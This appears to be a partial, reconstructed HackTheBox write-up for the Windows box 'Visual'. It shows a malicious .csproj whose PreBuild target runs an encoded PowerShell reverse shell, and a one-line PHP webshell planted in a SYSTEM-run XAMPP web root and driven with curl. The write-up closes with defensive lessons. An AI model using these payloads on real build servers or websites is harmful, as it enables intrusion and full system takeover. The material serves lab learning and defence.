---
title: "Visual"
date: 2024-02-24
type: docs
tags:
  - htb
  - windows
  - medium
  - dotnet
  - msbuild
  - prebuild-event
  - git
  - rce
  - xampp
  - webshell
  - service-account
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows Server 2022, **Difficulty:** Medium, **Released:** 2024-02-24, **IP:** `10.10.11.234` , `visual.htb`

</div>

<div class="callout callout-warning">

**Partial**

Nothing usable survived in my notes for this box. The whole walkthrough below is reconstructed from published writeups (0xdf, Ev3rPalestine) and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. `visual.htb` is a service that takes a **Git repository URL**, clones it, builds the .NET 6 project it finds, and returns the compiled binary.
2. Host a repo (a local Git server the box can reach) containing a `.csproj` with a **PreBuild event** (`<Target ... BeforeTargets="PreBuildEvent"><Exec Command="..."/>`). When the box builds it, your command runs. Shell as **`enox`**.
3. `enox` can **write to `C:\xampp\htdocs`**. Apache (XAMPP) runs as **`LOCAL SYSTEM`**, so drop a PHP webshell and browse to it. SYSTEM.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| (no credentials, both steps are code execution) | |
| `user.txt` | `C:\Users\enox\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

</div>

---

## Overview

Visual is a **build server** box. The service compiles arbitrary .NET projects you point it at, and MSBuild's project files are Turing complete: they can run commands during the build (`PreBuildEvent`, custom `Target`s, inline `Task`s). So "submit a repo to be built" is "submit code to be run". The privesc is a **service account misconfiguration**: the user you land as can write into the Apache document root, and Apache runs as SYSTEM, so a webshell there executes as SYSTEM. It is a good box for the lesson that build systems and CI runners are RCE by design and must be isolated.

Related "submit code / config to a builder" boxes: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/) (Shadow YAML), [Inject](/writeups/hackthebox/linux/easy/inject/) (Ansible). Related webshell into a SYSTEM-owned web root: [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference. Related MSBuild abuse: also a common AV bypass technique.

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4   (XAMPP)
```

The site accepts a URL to a Git repository. It clones the repo, looks for a `.sln` / `.csproj`, builds it with `dotnet build`, and gives you back the `.exe`. It rejects GitHub/GitLab URLs, so you have to serve the repo yourself.

### Foothold, malicious MSBuild project

<div class="callout callout-note">

**Serve a Git repo the box can clone**

Run a dumb HTTP Git server on your box (`git daemon`, or `python3 -m http.server` over a bare repo with `git update-server-info`), commit a minimal .NET 6 console project, and submit `http://10.10.14.5:8000/repo.git`. The box clones and builds it.

</div>

<div class="callout callout-note">

**PreBuild event RCE**

MSBuild runs targets during a build. A `.csproj` like this executes `Command` before compilation:
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell -e &lt;base64 reverse shell&gt;" />
  </Target>
</Project>
```
The box builds it as `enox` and your PowerShell fires. (You can also use a `<PreBuildEvent>` property, or `<UsingTask>` with inline C#.)

</div>

Catch the shell as **`enox`**. `user.txt` is on the desktop.

### Privilege Escalation, write to the SYSTEM web root

```powershell
icacls C:\xampp\htdocs
# ... enox:(OI)(CI)(W)          <-- enox can write here
sc.exe qc Apache2.4
# SERVICE_START_NAME : LocalSystem
```

<div class="callout callout-note">

**Apache runs as SYSTEM**

XAMPP installs Apache as a service running under `LocalSystem` by default. Anything PHP executes therefore runs as SYSTEM. `enox` has write access to `C:\xampp\htdocs`, so drop a webshell and request it.

</div>

```powershell
echo '<?php system($_REQUEST["c"]); ?>' > C:\xampp\htdocs\s.php
```

```bash
curl "http://visual.htb/s.php?c=whoami"
# nt authority\system
curl "http://visual.htb/s.php?c=powershell -e <b64 rev shell>"
```

SYSTEM shell, read `root.txt`.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Users\enox\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` |

---

## Lessons and Takeaways

- **Build systems are code execution.** MSBuild, Gradle, Maven, npm `postinstall`, Makefiles all run arbitrary commands. Build untrusted code in a throwaway, network-isolated, unprivileged sandbox.
- **Do not run Apache / IIS / any internet-facing service as `LocalSystem`.** Use a low-privilege service account with write access only to what it needs.
- **The web root should not be writable by interactive users.** `enox` writing to `htdocs` is the whole privesc.
- **Reject or fully sandbox arbitrary Git URLs.** Allowlisting GitHub is not enough if you clone and build.

---

## Related Writeups

- **Submit config / code to a builder or runner:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [Inject](/writeups/hackthebox/linux/easy/inject/)
- **Webshell into a SYSTEM-owned web root:** [Visual](/writeups/hackthebox/windows/medium/visual/) is the reference
- **.NET / MSBuild abuse:** [POV](/writeups/hackthebox/windows/medium/pov/) (ViewState), [Anubis](/writeups/hackthebox/windows/insane/anubis/)

## References

- HTB Visual (0xdf) <https://0xdf.gitlab.io/2024/02/24/htb-visual.html>
- MSBuild targets and tasks <https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-targets>
- Visual PoC project (Ev3rPalestine) <https://github.com/Ev3rPalestine/Visual-HTB-Walkthrough>
